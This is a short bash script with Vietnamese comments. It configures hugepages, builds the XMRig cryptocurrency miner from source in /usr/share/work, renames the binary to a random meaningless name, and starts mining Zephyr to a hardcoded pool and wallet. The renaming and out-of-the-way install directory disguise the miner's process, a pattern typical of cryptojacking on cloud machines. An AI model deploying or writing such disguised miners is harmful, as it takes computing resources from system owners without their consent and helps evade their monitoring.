#!/bin/bash

# Cập nhật gói và cài đặt sysctl cho vm.nr_hugepages
sudo apt-get update
sudo sysctl -w vm.nr_hugepages=1280
sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"

# Định nghĩa các biến cần thiết
VERSION=6.21.0
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
POOL=ca-zephyr.miningocean.org:5432
USERNAME=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB
ALGO=rx/0
DONATE=1

# Cài đặt các gói cần thiết
apt-get install -y git wget screen cmake g++ libuv1-dev libssl-dev libhwloc-dev

# Tạo thư mục và di chuyển vào thư mục làm việc
mkdir -p /usr/share/work
cd /usr/share/work

# Tải xuống và giải nén XMRig
rm -rf xmrig-$VERSION
wget https://github.com/xmrig/xmrig/archive/refs/tags/v$VERSION.tar.gz
tar -xvzf v$VERSION.tar.gz
rm -f v$VERSION.tar.gz
mv xmrig-$VERSION xmrig
cd xmrig
mkdir build && cd build
cmake ..
make -j$(nproc)

# Đổi tên tệp thực thi và sao chép để sử dụng
mv xmrig $azure -n
cp $azure "$cpuname"
rm -f xmrig

# Bắt đầu đào coin trên GPU với XMRig
./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.ws-p x -a $ALGO -k --tls
